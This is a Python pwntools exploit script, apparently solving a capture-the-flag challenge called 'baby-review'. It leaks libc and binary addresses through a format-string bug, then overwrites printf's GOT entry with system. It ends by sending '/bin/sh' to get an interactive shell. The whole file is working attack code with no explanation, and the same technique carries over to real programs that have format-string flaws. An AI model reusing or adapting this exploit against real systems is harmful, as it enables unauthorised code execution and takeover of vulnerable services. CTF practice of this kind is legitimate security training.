#!/usr/bin/env python3
from pwn import *
from countryinfo import CountryInfo

exe = './baby-review'

elf = context.binary = ELF('baby-review')
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''

'''.format(**locals())


#### Exploit starts here ####

io = start()

libc = ELF('libc.so.6')


LIBC_OFFSET = libc.symbols['_IO_2_1_stdout_']
BIN_OFFSET = 0x1580


country = io.recvlines(2)
country = country[1].split()[5][:-1].decode()
capital = CountryInfo(country).capital()

io.sendline(capital)

io.sendlineafter(b'Exit',b'5')

io.sendlineafter(b'list',b'%29$p %9$p')

io.sendlineafter(b'Exit',b'2')

leaks = io.recvlines(8)[6]

libc_leak = leaks.split()[0]
bin_leak = leaks.split()[1]

log.info(f"libc leak {libc_leak}")
log.info(f"bin leak {bin_leak}")


libc_leak = int(libc_leak,16)
bin_leak = int(bin_leak,16)

libc_main = libc_leak - LIBC_OFFSET
bin_main = bin_leak - BIN_OFFSET

elf.address = bin_main
libc.address = libc_main


log.info(f"libc base addr {hex(libc_main)}")
log.info(f"bin base addr {hex(bin_main)}")

printf_addr = elf.got.printf
libc_system = libc.symbols.system


#offset is 10

payload =  fmtstr_payload(10, {
    elf.got.printf : libc_system 
    }, write_size='short')


log.info(f"printf address: {hex(elf.got.printf)}")
log.info(f"system addr: {hex(libc_system)}")

io.sendlineafter(b'Exit',b'5')
io.sendline(payload) 
io.sendlineafter(b'Exit',b'2')


io.sendlineafter(b'Exit',b'5')
io.sendline(b'/bin/sh')
io.sendlineafter(b'Exit',b'2')
io.interactive()